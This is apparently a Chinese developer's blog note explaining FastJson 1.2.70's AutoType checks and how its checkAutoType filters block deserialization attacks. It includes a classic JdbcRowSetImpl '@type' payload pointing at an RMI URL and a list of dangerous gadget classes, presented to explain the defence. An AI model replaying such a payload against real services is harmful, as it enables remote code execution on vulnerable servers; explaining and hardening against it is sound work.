---
date: 2024-02-23
title: v1.2.70-FastJson的AutoType机制研究
category: 
  - 笔记
tag:
  - note
head:
  - - meta
    - name: keywords
      content: FastJson、AutoType机制、黑客
---
# v1.2.70-FastJson的AutoType机制研究

最近在对接Alexa亚马逊语音技能，`Smart Home Skill Apis`时，有一个配置的JSON字符串是这样的：

```json
     { 
         "capabilityResources": {
                "friendlyNames": [
                  {
                    "@type": "asset",
                    "value": {
                      "assetId": "Alexa.Setting.Opening"
                    }
                  }
                ]
              }
     }
```

在开发配置，只当是一个普通的字符串；直到单测开始，在解析这行字符串成JSONObject对象的时候报错，同时也抛出了一个异常：

`Exception in thread "main" com.alibaba.fastjson.JSONException: autoType is not support. asset`

![](https://leyunone-img.oss-cn-hangzhou.aliyuncs.com/image/2024-02-21/45b1cd32-e672-42e5-86a8-d3b1a77017a4.png)

fastjson版本是：

```xml
        <dependency>
            <groupId>com.alibaba</groupId>
            <artifactId>fastjson</artifactId>
            <version>1.2.70</version>
        </dependency>
```

autoType is not support，是什么含义，为什么fastjson独对这个字符串进行了check设置了`ParserConfig.checkAutoType`方法？

## auToType问题

首先简单的解释一下为什么序列化中需要 引入`AutoType`；

假设存在一个类，和一个接口：

```java
public interface Father{
    
}
```

```java
public class Son implements Father{
    private Integer age;
}
```

构建出Son类后，json会将类型抹去，只保留顶级接口类型，使之反序列化时拿不到原先的Son类。

因此FastJson中就使用了`"@type":"com.xx.xx.Son"`

指定json串反序列化时的类型；这种设置在Redis中也有体现，采用的是

```json
{
    "com.xx.xx.Son",
    "age":1
}
```

的形式.

**那么就带来了一个严重的问题#**

在FastJson反序列的过程中，会通过@type构造类，并且根据后续的key调用其setter方法。

那么有经验的人可能有解除过，JAVA中存在着大量的风险类：

1. **`com.sun.rowset.JdbcRowSetImpl`**：这个类在被实例化时会自动连接数据库，存在潜在的安全风险。
2. **`java.lang.Runtime`**：`java.lang.Runtime`类在被实例化时会自动获取运行时对象，可以用于执行系统命令。
3. **`java.lang.ProcessBuilder`**：`java.lang.ProcessBuilder`类在被实例化时会自动启动一个进程，可能导致系统被恶意利用。
4. **`javax.script.ScriptEngineManager`**：这个类在被实例化时会加载脚本引擎，存在潜在的安全风险。
5. **`java.util.logging.FileHandler`**：`java.util.logging.FileHandler`类在被实例化时会自动创建日志文件，可能导致文件系统被攻击。

拿例子最多，也是早年攻击最频繁的`JdbcRowSetImpl`一说：

将 JSON字符串

```json
{
	"@type": "com.sun.rowset.JdbcRowSetImpl",
	"dataSourceName": "rmi://127.0.0.1:8888/Error",
	"autoCommit": true
}
```

通过抓目标服务器JAVA，WEB应用的请求包，重新reSend一次；

然后jdk会在解析过程中构建 `JdbcRowSetImpl` 类，实现rmi远程调用的攻击；

不止如此，由于@type指定类的多样性，在获取到对方源码之后。

还可以通过此解析构造的模式直接从项目内部做出高危风险的操作。

因此FastJson在1.2.25版本后，推出完整的AutoType机制，开始了与黑客的 `checkAutotype` 博弈

## CheckAutoType源码问题定位

因为每个版本的FastJson对checkAutoType都有大大小小的优化，贴图的代码版本是`1.2.7`。

**第一次过滤**：

![](https://leyunone-img.oss-cn-hangzhou.aliyuncs.com/image/2024-02-22/550461bb-aec8-4d25-9b29-31ff6cef6c21.png)



### 1/

首先在`1.2.68` 版本中，引入的**safeMode**，为JSONObject对象初始化的时候会根据是否配置 `fastjson.parser.safeMode` 值进行开启安全模式，默认为false；在safeMode模式下，无论白名单和黑名单，都不支持autoType，这样可以杜绝反序列化Gadgets类变种攻击，需要通过`ParserConfig.getGlobalInstance().setSafeMode(true);` 开启

**安全模式**：取消 `@type` 指定类解析的机制

### 2/

下面的类型名>=192，小于<3，意义不明；

不过，围绕名字有一个有趣的地方；

因为事关类解析，所以fastjson没有对 @type:"xxxx"，xxxx为整形时的内容做任何限制；

所以 

```json
{
    "@type":"123"
}
```

是可以正常解析的

取消指定于3，则是???，意义不明

 **第二次过滤**:

![](https://leyunone-img.oss-cn-hangzhou.aliyuncs.com/image/2024-02-22/3a3bd0f4-3689-4388-87ff-4e4b2dbaca90.png)

### 3/

这里为符号过滤，取第一个符号以及最后一个符号进行描述符检查，过滤字符串为 `[` 和 `L`

这两个字符的含义是：

- **`[` 字符**：这个字符在 Java 中通常用于表示数组类型，恶意攻击者可能利用这个字符来构造恶意的数组类型，从而绕过安全检查，执行恶意代码。
- **`L` 字符**：这个字符在 Java 中通常用于表示类的全限定名，恶意攻击者可能利用这个字符来构造恶意的类名，从而触发恶意行为。

在 `1.2.43`中进行的修复。

**第三次过滤**

![](https://leyunone-img.oss-cn-hangzhou.aliyuncs.com/image/2024-02-23/272a0bc5-1368-479c-9deb-8acb7c0ba371.png)

### 4/

上一段为最暴力的黑名单过滤；

与黑客斗智斗勇中进化，从过去的类名名单判断，到现在使用hashCode散列存储的方式；

一是掩盖了当前黑名单的类，二是代码性能极大提高；

### 5/

下面一段先是使用通过`typeName` 和`INTERNAL_WHITELIST_HASHCODES` 的计算寻址得到的boolean类型判断是否进入黑白名单的判断。

内部代码为，如果在白名单内则直接加载类，结束本次 `checkAutoType`；

否则直接抛出异常

**第四次过滤**

![](https://leyunone-img.oss-cn-hangzhou.aliyuncs.com/image/2024-02-23/52f05add-91b7-4ff5-a86c-c1a48e6a7046.png)

### 6/

从deserializers、typeMapping、白名单中获得class；

判断其是否为解析目标时，指定类型的子类；

如果为否，则直接抛出异常；

**AutoType关闭时过滤：**

<img src="https://leyunone-img.oss-cn-hangzhou.aliyuncs.com/image/2024-02-23/939815fd-ea54-448c-8dfb-e2ea89fe5a1d.png" style="zoom:67%;" />

直接针对FastJson现有的黑名单以及白名单进行判断

**最后一次过滤**

<img src="https://leyunone-img.oss-cn-hangzhou.aliyuncs.com/image/2024-02-23/ddd5f89a-dfd4-46a6-929c-6ea48cbaa651.png" style="zoom: 67%;" />

针对类型的判断，高危接口：DataSource、RowSet、ClassLoader；

即使黑客前面绕的再好，也不会放开这三个涉及项目加载器，数据库DB的顶级接口；

最后也是判断一个构建出来的类是否已经存在了已经构建完成的构造器，如果存在，则一定是黑客为了绕开检车伪装的类。

因此重复构造直接抛出错误

## 总结

FastJson的漏洞与更新几乎都是围绕着checkAutoType进行，因为一款JSON化的工具，再本身性能难以再度突破的前提下，保证使用者的安全体验是衡量各个工具之间的重中之重。

但由由于FastJson在国内广泛的使用，而不管目前如何去更新，总有漏洞会为版本买单。

所以很多人也在Git上发起issues抗议这些问题：

<img src="https://leyunone-img.oss-cn-hangzhou.aliyuncs.com/image/2024-02-23/94eb75a8-bdd6-4f2f-83bb-c961c5a03442.png" style="zoom:67%;" />

讨论度也非常高，也有人不懂@type的存在意义。了解的人能知道，这也是无奈之举，像jackson中也引入了类型的`@Class` 关键字

大伙也需要给开源者，开源项目更多耐心；

在使用上，可以和开源这个项目的公司[阿里巴巴]一致，默认没有autoType或者直接开启安全模式一刀切